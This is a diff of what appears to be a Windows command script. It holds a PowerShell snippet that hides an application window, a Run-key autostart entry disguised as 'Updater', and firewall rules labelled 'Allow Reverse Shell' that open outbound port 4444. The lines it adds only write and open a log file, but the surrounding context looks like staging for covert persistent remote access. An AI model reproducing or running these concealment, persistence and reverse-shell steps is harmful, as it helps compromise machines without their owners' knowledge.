@@ -98,6 +98,11 @@ cd C:\Users\%USERNAME%\Desktop && start Wifi_BasedSurvelliance_Drone.pdf
 dism /online /Enable-Feature /FeatureName:TelnetClient
 cd C:\Users\%USERNAME%\Desktop\ && CodeBlocks.lnk
 
+
+echo %DATE% %TIME% Script triggered >> C:\Users\Public\log.txt
+cd C:\Users\Public && start log.txt
+
+
 ///to hide the app
 powershell -command "$hwnd = (Get-Process My_Custom_Softwere).MainWindowHandle; Add-Type -AssemblyName 'System.Windows.Forms'; Add-Type -AssemblyName 'System.Runtime.InteropServices'; $sig = '[DllImport(\"user32.dll\")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'; Add-Type -MemberDefinition $sig -Name NativeMethods -Namespace Win32; [Win32.NativeMethods]::ShowWindowAsync($hwnd, 2)"
 
@@ -184,5 +189,6 @@ reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ 
 New-NetFirewallRule -DisplayName "Allow Reverse Shell" -Direction Outbound -Protocol TCP -RemotePort 4444 -Action Allow
 Add-Content -Path "C:\Users\Public\log.txt" -Value "$(Get-Date): updater.ps1 triggered"
 netsh advfirewall firewall add rule name="Allow Reverse Shell" dir=out action=allow protocol=TCP remoteport=4444
+
 
 
